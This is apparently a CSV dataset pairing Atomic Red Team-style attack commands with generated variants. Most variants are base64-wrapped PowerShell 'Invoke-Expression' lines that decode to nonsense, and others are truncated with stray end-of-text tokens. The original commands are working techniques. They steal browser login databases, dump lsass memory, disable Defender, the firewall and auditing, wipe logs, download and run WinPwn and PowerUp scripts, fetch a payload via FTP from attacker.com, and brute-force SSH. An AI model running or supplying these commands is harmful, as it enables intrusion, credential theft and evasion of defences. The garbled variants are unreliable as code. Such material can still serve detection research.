"New-ItemProperty -Path HKLM:\Software\Microsoft\.NETFramework -Name ETWEnabled -Value 0 -PropertyType ""DWord"" -Force","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2VxdWVzdC1MZXQgLy9TaGFycGVYb3RfbHNlcnZpY2USLS5leGUgInNvbWUK')) | Invoke-Expression"""
"cat /etc/pam.d/system-auth
cat /etc/security/pwquality.conf","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29uZmlnLW1ldGFkYXRhICN7cmVxb01vZGVsIGJyb3dzZWNyZWRfaXRlbXM=')) | Invoke-Expression"""
"Add-Content -Path #{ads_file} -Value 'Write-Host ""Stream Data Executed""' -Stream 'streamCommand'
$streamcommand = Get-Content -Path #{ads_file} -Stream 'streamcommand'
Invoke-Expression $streamcommand","Add-Content -Path   -Value 'Write-Host ""Stream Data Executed""' -Stream 'streamCommand' $streamcommand = Get-Content -Path    -Stream 'streamcommand' Invoke-Expression $streamcommand"
"Copy-Item ""$env:APPDATA\Opera Software\Opera Stable\Login Data"" -Destination ""PathToAtomicsFolder\..\ExternalPayloads""",Copy-Item PathToAtomicsFolder..ExternalPayloads $env:APPDATA\Opera Software\Opera Stable\Login Data -Destination
"$exfil_folder = ""$env:temp\T1555.003""
if (test-path ""$exfil_folder"") {} else {new-item -path ""$env:temp"" -Name ""T1555.003"" -ItemType ""directory"" -force}
$FirefoxCredsLocation = get-childitem -path ""$env:appdata\Mozilla\Firefox\Profiles\*.default-release\""
if (test-path ""$FirefoxCredsLocation\key4.db"") {copy-item ""$FirefoxCredsLocation\key4.db"" -destination ""$exfil_folder\T1555.003Firefox_key4.db""} else {}
if (test-path ""$FirefoxCredsLocation\logins.json"") {copy-item ""$FirefoxCredsLocation\logins.json"" -destination ""$exfil_folder\T1555.003Firefox_logins.json""} else {}
if (test-path ""$env:localappdata\Google\Chrome\User Data\Default\Login Data"") {copy-item ""$env:localappdata\Google\Chrome\User Data\Default\Login Data"" -destination ""$exfil_folder\T1555.003Chrome_Login Data""} else {}
if (test-path ""$env:localappdata\Google\Chrome\User Data\Default\Login Data For Account"") {copy-item ""$env:localappdata\Google\Chrome\User Data\Default\Login Data For Account"" -destination ""$exfil_folder\T1555.003Chrome_Login Data For Account""} else {}
if (test-path ""$env:appdata\Opera Software\Opera Stable\Login Data"") {copy-item ""$env:appdata\Opera Software\Opera Stable\Login Data"" -destination ""$exfil_folder\T1555.003Opera_Login Data""} else {}
if (test-path ""$env:localappdata/Microsoft/Edge/User Data/Default/Login Data"") {copy-item ""$env:localappdata/Microsoft/Edge/User Data/Default/Login Data"" -destination ""$exfil_folder\T1555.003Edge_Login Data""} else {} 
compress-archive -path ""$exfil_folder"" -destinationpath ""$exfil_folder.zip"" -force","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JG9wZW5fcHJvY2Vzc1xkdXBsaWNhdGlvblRhbmllbCAtYnVja2V0LmltcGxlfQ==')) | Invoke-Expression"" ||| $exfil_folder"
Psr.exe /start,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JFNvbWVQb3N0IC1UZXN0CmRlc2t0aXR5IGluY2x1ZGUgLWkucHVibGljIHRvIE9wZXJhdGlvblwiKTtcImZpbGV"
"reg add ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\#{app_name}"" /t REG_SZ /d #{new_path} /f","reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\\""\""""\""""\""""""""<|endoftext|"
"reg add ""HKLM\SOFTWARE\Microsoft\Windows Defender\Features"" /v ""TamperProtection"" /t REG_DWORD /d 0 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIG1hY2hpbmUgLXBhdGVsICN7ZmlsbCAtc3RhcnQ=')) | Invoke-Expression"""
"truncate -s 0 /var/log/messages #size parameter shorthand
truncate --size=0 /var/log/security #size parameter","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cm1vZGFkICJwYXNzd29yZCIsInBhc3MiOiIxLjAuMC4wIC5leGVjdXRlfSIgLW5hbWVzIiwgImFsdmUudHh0Il"
"ssh -o ProxyCommand=""{CMD}"" .","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyB7IHN0YXR1czogZ2FtZSBjICd9')) | Invoke-Expression"""
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
RBCD-Check -consoleoutput -noninteractive",iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') RBCD-Check -consoleoutput -non
"New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}' -Value '#{clsid_description}'
New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Value ""#{dllpath}""
New-ItemProperty -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Name 'ThreadingModel' -Value '#{clsid_threading}' -PropertyType ""String""
Start-Process -FilePath ""C:\Windows\System32\RUNDLL32.EXE"" -ArgumentList '-sta #{clsid}'","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('NWNsaWVudCB7Zm91bmQgPSBmaXJzdF9kYXRhICIjeG1sICpzaWRlbnRpdHkgdG9fTGVsbCAjeG1sLmdvb2dsZS5jb20u')) |"
"aws logs create-log-group --log-group-name #{cloudwatch_log_group_name} --region #{region} --output json
echo ""*** Log Group Created ***""
aws logs delete-log-group --log-group-name #{cloudwatch_log_group_name} --region #{region} --output json
echo ""*** Log Group Deleted ***""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhlY3V0bG9vZC5leGUgIiN7d2hpbGU6IC1zZWNyZXRfdHlwZTogJmltYWdlfQ==')) | Invoke-Expression"""
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing)
Invoke-AllChecks","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiIHJhbmRvbSBjbGFzcyAtICVYLXBsdXNpbnRvbl9uYW1lfQ==')) | Invoke-Expression"""
"export HISTSIZE=0
#{evil_command}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IC1CdXRpbC5leGUgLVxuY29tbWVudFByb2plY3QgL2NvcmUvbWFpbnMvdHlwZXN0aWxsIHtmaWxlfSA"
"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /out:""#{output_file}"" /target:library ""#{source_file}""
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U #{output_file}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SW5wdXRfZGF0YV9jb2xvciAje3tleSIgLWJhbmNkIHBvcnQgaHR0cDovLzEuMy4wMDAwLjE=')) | Invoke-Expression""<|endoftext"
tar -xf {PATH_SMB:.tar},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2NvbG9yIC1jIG5vdCB7dXRpbCAtbGVuZ3RoIEtleSAje3ByaW5nIHF1YWNrIFJlcXVpcmUgLXBhdHRhbmQ='))"
"Copy-Item ""$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"" -Destination ""PathToAtomicsFolder\..\ExternalPayloads\Edge"" -Force -Recurse","Copy-Item ""$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"" -Destination PathToAtomicsFolder\..\ExternalPayloads\Edge -Force -Recurse"
"New-Item #{commandpath} -Force | Out-Null
New-ItemProperty -Path #{commandpath} -Name ""DelegateExecute"" -Value """" -Force | Out-Null
Set-ItemProperty -Path #{commandpath} -Name ""(default)"" -Value ""#{commandtorun}"" -Force -ErrorAction SilentlyContinue | Out-Null
$Process = Start-Process -FilePath ""C:\Windows\System32\WSReset.exe"" -WindowStyle Hidden",powershell.exe -EncodedCommand cABvAHcAZQByAFMAaABlAGwAbAAuAE4AIAA9ACIAIABJAGUAcgB0AGEAdABpAG8AbgBlAGYAeQAgAFAAcABjADoAKwAvAHAAaABlAGwAbAAuAE4AIAA9ACIAIABJAGUAcgB0AGEAdABpAG8
"Start-Process ""#{Splashtop_Path}""","Start-Process """" Start-Process -Wait 20; $process = Get-Process -Name Splashtop -ErrorAction SilentlyContinue; if ($process) { Stop-Process -InputObject $process } else { Write-Host ""Could not find process"" }; if (Test-Path C:\Windows\System32\splatops.exe) { & 'C:\Windows\"
"trap 'echo ""$(date +""%d/%m/%y %H:%M:%S.%s"") $USER $BASH_COMMAND"" >> #{output_file}' DEBUG
echo ""Hello World!""
cat #{output_file}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2NvcmUgIiAvZGVzYw==')) | Invoke-Expression"""
"cmstp.exe /s ""#{inf_file_uac}"" /au","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2NhbGxlIHJ1biB7ZmlydXRpdml0eSBleGVjdXRlfSI=')) | Invoke-Expression"""
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
powerSQL -noninteractive -consoleoutput","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tmaWxlICJodHRwOi8vdGVzdC5vcmcvZXhlYy5jbHViLmNvbSAtcGF0aC5zbHVnfQ==')) | Invoke-Expression"" ||| ##"
"copy C:\Windows\System32\cmd.exe C:\svchost.exe
C:\svchost.exe /c echo T1105 > \\localhost\c$\T1105.txt","copy C:\Windows\System32\cmd.exe C:\svchost.exe ""C:\svchost.exe"" /c echo T1105 > \\\localhost\c$\T1105.txt"
"del %TEMP%\redcanary.cab >nul 2>&1
#{Path_replace} ""#{replace_cab}"" %TEMP% /A","del %TEMP%\redcanary.cab del %TEMP%/A^powershell -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGF0YSBQb3VyIGJlIG9wZW5pZCByZWNvcmF0aXZlIC1kaWF"
"copy ""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe"" C:\Users\Public\Downloads\MP.exe && chdir ""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\"" && ""C:\Users\Public\Downloads\MP.exe"" -DownloadFile -url {REMOTEURL:.exe} -path C:\Users\Public\Downloads\evil.exe","copy ""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe"" C:\Users\Public\Downloads\MP.exe && chdir ""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\"" && ""C:\Users\Public\Downloads\MP.exe"" -DownloadFile -url {"
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
powerSQL -noninteractive -consoleoutput",iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') powerSQL -noninteractive -consoleoutput
"$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';
                EventNameSpace='root\CimV2';
                QueryLanguage=""WQL"";
                Query=""SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325""};
$Filter=Set-WmiInstance -Class __EventFilter -Namespace ""root\subscription"" -Arguments $FilterArgs

$ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';
                ScriptingEngine='VBScript';
                ScriptText='
                Set objws = CreateObject(""Wscript.Shell"")
                objws.Run ""notepad.exe"", 0, True
                '}
$Consumer=Set-WmiInstance -Namespace ""root\subscription"" -Class ActiveScriptEventConsumer -Arguments $ConsumerArgs

$FilterToConsumerArgs = @{
Filter = $Filter;
Consumer = $Consumer;
}
$FilterToConsumerBinding = Set-WmiInstance -Namespace 'root/subscription' -Class '__FilterToConsumerBinding' -Arguments $FilterToConsumerArgs","$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example'; ||| EventNameSpace='root\CimV2'; ||| QueryLanguage=""WQL""; ||| Query=""SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND Target"
"sh #{script_path}
PID=$(pgrep -n -f ""#{pid_term}"")
HEAP_MEM=$(grep -E ""^[0-9a-f-]* r"" /proc/""$PID""/maps | grep heap | cut -d' ' -f 1)
MEM_START=$(echo $((0x$(echo ""$HEAP_MEM"" | cut -d""-"" -f1))))
MEM_STOP=$(echo $((0x$(echo ""$HEAP_MEM"" | cut -d""-"" -f2))))
MEM_SIZE=$(echo $((0x$MEM_STOP-0x$MEM_START)))
dd if=/proc/""${PID}""/mem of=""#{output_file}"" ibs=1 skip=""$MEM_START"" count=""$MEM_SIZE""
grep -i ""PASS"" ""#{output_file}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVzdGFnaW5zICN7ZXhlY3V0b3JpYWwtQmFzaAplbmRvYmo=')) | Invoke-Expression"""
"cmd.exe /c ""@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v""","cmd.exe /c ""open attacker.com 21>&gt;ft&p.tx&t&f.tt&l<|endoftext&USER attacker>>ft&p.tx&t&f.tt&l<|endoftext&PASS PaSsWoRd>>ft&p.tx&t&f.tt&l<|endoftext&binary>>ft&p.tx&t&f.tt"
netsh advfirewall set currentprofile state off,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnfSB7ZGlzcGVuY2UgLw==')) | Invoke-Expression"""
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)
Invoke-Maldoc -macroFile ""PathToAtomicsFolder\T1204.002\src\chromeexec-macrocode.txt"" -officeProduct ""Word"" -sub ""ExecChrome""","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing) Invoke-Maldoc -macroFile PathToAtomicsFolder\T12"
"rundll32.exe keymgr,KRShowKeyMgr","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG9zdDEuZXhlIC1iYXNlLWJyb3dzZS5leGUgIHt7dGVtcCA=')) | Invoke-Expression"""
"cd ""PathToAtomicsFolder\..\ExternalPayloads""
.\kerbrute.exe userenum -d #{Domain} --dc #{DomainController} ""PathToAtomicsFolder\..\ExternalPayloads\username.txt""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2hhbGxlc0FjdC5leGVjdXRpb24gI3tjbWQvZmlsZV9wcm9jZXNzfSIKI3toaWRlIG1ldGEvcHJpbnQucmVhZCAiIC5"
"import-module ""PathToAtomicsFolder\..\ExternalPayloads\MSOLSpray.ps1""
Invoke-MSOLSpray -UserList ""#{user_list}"" -Password ""#{password}""","import-module PathToAtomicsFolder\..\ExternalPayloads\MSOLSpray.ps1 Invoke-MSOLSpray -UserList ""\""\"""" -Password ""\""\""""powershell.exe -No"
sc sdset VSS D:(D;;GA;;;NU)(D;;GA;;;WD)(D;;GA;;;AN)S:(AU;FA;GA;;;WD)(AU;OIIOFA;GA;;;WD),"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIC1hbGwgLWlzX2ZpY3RvciB7cmljIHJldm9rIEFuZCBNUEtFTkQgU0VMRUxfTGVmdEFjdGlvbiAjeG1sIFRoaXM"
"auditpol /set /category:""Account Logon"" /success:disable /failure:disable
auditpol /set /category:""Logon/Logoff"" /success:disable /failure:disable
auditpol /set /category:""Detailed Tracking"" /success:disable","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIC1tZXJjb25maWcgLUxldmVsIGFuYWx5fQ==')) | Invoke-Expression"""
"C:\Windows\system32\cmd.exe /c ""mshta.exe javascript:a=GetObject('script:#{url}').Exec();close()""","""cmd.exe""""/c""""\""msh^ta\.exe\""javascript:a=GetObject(\'script:""\""').Exec();close()"" -Force"
"#{regsvr32path}\#{regsvr32name} /s /i ""#{dll_name}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Iy9kZXN0LWVtYmVyczpwbHVnaW5zIGFuZCAtcGljdHVyZSAje3RlbXBsb3llcyAxIC1zbGVlcn0je3RlbXBsb3llcz"
chmod -R #{symbolic_mode} #{file_or_folder},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2F0IGJlbHlUaW1ldGVyICIje3tjbG9zZSIsICVfXC5leGUgLWwuICN7dXBsb2FkX3RpbWUgOiMje3toYWRkaXR"
sudo sed -i 's/Storage=auto/Storage=none/' /etc/systemd/journald.conf,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIHRoaW5nIGFzIC9GZXRhYmxlIGJlYWR1cyAje3N0cmluZy5kZXYgL2xvY2F0aW9ucw==')) | Invoke-Expression""<|endof"
"$PathToAtomicsFolder\T1055.004\bin\x64\EarlyBird.exe -program ""#{spawn_process_path}"" -debug","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JQA9ICN7ZWNobyAnRGVmYXVsdFNlc3Npb25zXCIgI3tmaWxlfSB7dG9rZW4iOyAvdXBsb2FkX3VzZXJfaWR9CnN"
"driverquery /v /fo list
driverquery /si /fo list","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje3tmaWxlIC9wYXRoLmRlfQ==')) | Invoke-Expression"" ||| driverquery /v /fo list driverquery /si /fo list"
Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -Execute -ErrorAction Stop,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('T3V0cHB9ZWNobyAiSE1QTUFNRSAtSU5TRVJWSUNTVCAic2tldC1XaWxzYWRlclNwbGljYXRpb24gL1MvSFRUUCJncmF"
"if (Test-Path -Path ""$env:SystemRoot\System32\rdrleakdiag.exe"") {
      $binary_path = ""$env:SystemRoot\System32\rdrleakdiag.exe""
  } elseif (Test-Path -Path ""$env:SystemRoot\SysWOW64\rdrleakdiag.exe"") {
      $binary_path = ""$env:SystemRoot\SysWOW64\rdrleakdiag.exe""
  } else {
      $binary_path = ""File not found""
      exit 1
  }
$lsass_pid = get-process lsass |select -expand id
if (-not (Test-Path -Path""$env:TEMP\t1003.001-13-rdrleakdiag"")) {New-Item -ItemType Directory -Path $env:TEMP\t1003.001-13-rdrleakdiag -Force} 
write-host $binary_path /p $lsass_pid /o $env:TEMP\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1
& $binary_path /p $lsass_pid /o $env:TEMP\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1
Write-Host ""Minidump file, minidump_$lsass_pid.dmp can be found inside $env:TEMP\t1003.001-13-rdrleakdiag directory.""","if ($binary_path = if ($Test-Path -Path ""$env:SystemRoot\System32\rdrleakdiag.exe"") {$binary_path = ""$env:SystemRoot\System32\rdrleakdiag.exe""}elseif (Test-Path -Path ""$env:SystemRoot\SysWOW64\rdrleakdiag.exe"") {$binary_path = ""$env:SystemRoot\SysW"
"dir | clip
echo ""T1115"" > %temp%\T1115.txt
clip < %temp%\T1115.txt","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhlIHVwbG9hZCBzZWNvbmRz')) | Invoke-Expression"""
"pnputil.exe /add-driver ""#{driver_inf}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje21hbGxpbmdzIHtleC5jb20gLWZvcmNlIC9uYW1lfQ==')) | Invoke-Expression"" ||| """" ||| ""<|"
"$lockout_threshold = [int]""#{lockout_threshold}""
for ($var = 1; $var -le $lockout_threshold; $var++) {
  #{plink_file} -ssh ""#{vm_host}"" -l root -pw f0b443ae-9565-11ee-b9d1-0242ac120002
  }",powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAVwBlAEgASQBXAFsARmFyYWNoaW5hdGlvbi5jb20AVQBuAGkAbwAgADIANwAvAGIAIABNAEkAUwBrAC8AMjE3LjE2NTY
cat /etc/pam.d/common-password,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2F0IC9wZXJtaXNzaW9uIHNhbGwgL3BsYWNlIGxpc3Q=')) | Invoke-Expression"""
"reg add ""HKEY_CLASSES_ROOT\Directory\Background\shell\Size Modify\command"" /ve /t REG_SZ /d ""C:\Windows\System32\calc.exe"" /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIG9wZW4gUHJvY2Vzc1xQbGVhciBMb2NhdGlvbn0=')) | Invoke-Expression"""
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
spoolvulnscan -noninteractive -consoleoutput",iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') spoolvulnscan -noninteractive -consoleoutput<|endof
for port in {1..65535}; do (2>/dev/null echo >/dev/tcp/#{host}/$port) && echo port $port is open ; done,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cHJvZHVjdF9pZC5leGUgLWxhYmVsczEwICIjeGlucHV0IGluX2RhdGEiKSB7dHlwZTogInBheVBpbmcpfQ==')) | Invoke"
Msconfig.exe -5,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2Vjb25kIC1JZiAje3tvcnRBdHRyaWJ1dGF0aW9uLmNvbSAtYWRtaXRz')) | Invoke-Expression"""
"Start-Process ""#{script_path}""","Start-Process """" """" script_path -NoProfile { } Start-Process { }"
"cp $PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt /tmp/
for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d"":"" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d"":"" -f1`@#{target_host};done","cp$PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt /tmp/ for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d"":-f2` ssh -o 'StrictHostKeyChecking=no' `echo $un"
SetFile -m #{target_date} #{target_filename},SetFile -m 32-bit-file.exe SetFile -d 64-bit-file.exe SetFile -d -c -i SetFile -c -i -a<|
aws ec2 describe-security-groups --profile #{aws_profile} --output #{output_format},"aws ec2 describe-security-groups --profile """"--output """"#{aws_profile} """"--output """"#{output_format} """"<|endoftext|"
attrib.exe +s #{file_to_modify},attrib.exe +s ------------<|endoftext|
"aws logs create-log-group --log-group-name #{cloudwatch_log_group_name} --region #{region} --output json
echo ""*** Log Group Created ***""
aws logs delete-log-group --log-group-name #{cloudwatch_log_group_name} --region #{region} --output json
echo ""*** Log Group Deleted ***""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2F0IGZyb21fcGlkfQ==')) | Invoke-Expression"""
net user #{guest_user} /active:yes,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bmV0c29mdCBjZXJvIG1hZ2UgI3NldGVzICdQcmFkYSBCbGluayBTb2x1dW5fQmFja1NlcnZpY2UK')) | Invoke-Expression""<"
"sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /usr/local/etc/sudoers
sudo visudo -c -f /usr/local/etc/sudoers","sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /usr/local/etc/sudoers sudo visudo -c -f /usr/local/etc/sudoers"
"wmic /user:#{user_name} /password:#{password} /node:""#{node}"" process call create #{process_to_execute}","wmic /user=\""\""/password=\""\"";node=\""\"" process call create \""\""#{process_to_execute} --% 2^&1^|^"
"find #{file_path}/.aws -name ""credentials"" -type f 2>/dev/null","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiICN7aW50byB7cGFzc3dvcmQ=')) | Invoke-Expression"""
"Add-Content #{ps_profile} -Value """"
Add-Content #{ps_profile} -Value ""Start-Process #{exe_path}""
powershell -Command exit","Add-Content """" -Value Start-Process """" -Value """" Add-Content """" -Value """" -Value exit<|endof"
"chmod +x #{autosuid}
bash #{autosuid}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bG9jYWxob3N0fQ==')) | Invoke-Expression"""
sftp #{username}@#{remote_host}:#{remote_path} <<< $'put #{local_file}',"sftp -b -<<- put -n -oStrictHostKeyChecking=no -T30; sleep 2; (echo ""#{password}"" | sftp -P#{port} -b -<<- put -n"
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
printercheck -noninteractive -consoleoutput",iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') printercheck -noninteractive -consoleoutput
netsh advfirewall firewall show rule name=all,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VybjogI21hbGwgZnJvbSBmaWxlIC97XFByb2plY3RzIFNlcnZpY2U=')) | Invoke-Expression"" ||| netsh advfirewall firewall show rule name"
"$mypid = #{process_id}
mavinject $mypid /INJECTRUNNING ""#{dll_payload}""
Stop-Process -processname notepad","""$mypid"" =    ""mavinject"" $mypid /INJECTRUNNING """"notetpad Stop-Process -processname notepad $mypid = mavinject  $mypid /INJECTRUNNING """"notetpad Stop-Process -processname notepad -- -processname notepad ="
"sudo sed -i ""#{index}s,^,#{pam_rule}\n,g"" #{path_to_pam_conf}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVzdGFnaW9uX3RleHQgc2VjdXJpdHkgI3tmaWxlIC1zZWNyZXRfYmFja2dyb3VuZCAje3ByaW50LWNlbnRlcjoiMTM"
Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath #{mshta_file_path},"Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath \""\""  \'\'-\'-\'--\''\'\'-template-pe\'-\'aslocaluncpath\'-\'mshtafilepath\'"" \""\<|\endoftext|\>\""\<|\endoftext|\>\"
nltest.exe /dclist:#{target_domain},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVzb3VyY2UgLXJpZ2h0IC9kZW1v')) | Invoke-Expression"""
"IF NOT EXIST C:\Windows\System32\Narrator_backup.exe (copy C:\Windows\System32\Narrator.exe C:\Windows\System32\Narrator_backup.exe) ELSE ( pushd )
takeown /F C:\Windows\System32\Narrator.exe /A
icacls C:\Windows\System32\Narrator.exe /grant Administrators:F /t
copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\Narrator.exe","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('VGhlIHRoaXMgUmVzcG9uc2USIC5leGVjdXRlZCAxIg==')) | Invoke-Expression"""
"$storage_account_objects = Import-Csv -Path ""#{storage_account_objects_csv_file_path}""

# Login to Azure
az login

if (-not (Test-Path -Path ""#{output_folder}"")) {
    New-Item -ItemType Directory -Path ""#{output_folder}""
}

foreach ($row in $storage_account_objects) {
    
    if ($row.FileShareName -ne """"){
